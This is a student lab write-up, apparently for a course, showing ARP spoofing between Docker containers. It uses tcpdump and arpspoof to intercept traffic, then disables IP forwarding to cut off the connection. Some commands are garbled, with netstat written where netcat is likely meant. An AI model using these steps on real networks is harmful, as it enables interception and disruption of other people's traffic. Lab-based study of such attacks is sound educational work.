# Lab 1 - ARP Spoofing

### Environment setup

Setup the controlled environment in which the attack will be simulated.

1. Clone the git repo: 
    
        git clone https://github.com/mcagalj/SRP-2021-22

2. Enter the directory:
        
        cd SRP-2021-22/arp-spoofing
    
3. Starting docker containers:
    
        ./start.sh
    
4. Enter docker container with an interactive terminal:
    
        docker exec -it <container-name> bash
    
5. Check if the network between containers is up (from station-1):
    
        ping station-2
    
6. Find IP and MAC addresses of each docker container:
    
        ifconfig -a

    **station-1:**
    
        IP: 172.22.0.2
        
        MAC: 02:42:ac:16:00:02
    
    **station-2:**
    
        IP: 172.22.0.4
        
        MAC: 02:42:ac:16:00:04
    
    **evil-station:**
    
        IP: 172.22.0.3
        
        MAC: 02:42:ac:16:00:03
    

### Emulating a 'real' situation

Emulation of a conversation between two computers, in our case containers on the same docker virtual network.

1. To open connection between **station-1** and **station-2**:
    
    On **station-2**: 
    
        netstat -l -p 8000
    
    **station-2** behaves like a server listening for connections
    
    On **station-1**: 
    
        netstat station-2 8000
    
    **station-1** behaves like a client requesting to connect to **station-2**
    

### Attack

In the controlled environment that was set up, emulate an attack.

1. Listen traffic on **eth0** (network on which all containers are connected on) on **evil-station**:
    
        tcpdump
    
2. Perform ARP spoofing:
    
        arpspoof -t station-1 -r station-2
    
3. To filter `tcpdump` output:
    
        tcpdump -XA station-1 and not arp
    
4. DOS between **station-1** and **station-2**:
    
        echo 0 > /proc/sys/net/ipv4/ip_forward
    
    Stop IP forwarding from **evil-station** to **station-2 →** results in messages not being forwared to **station-2,** also consequently TCP connection breaks down since **station-1** can't send ACK signal to **station-2**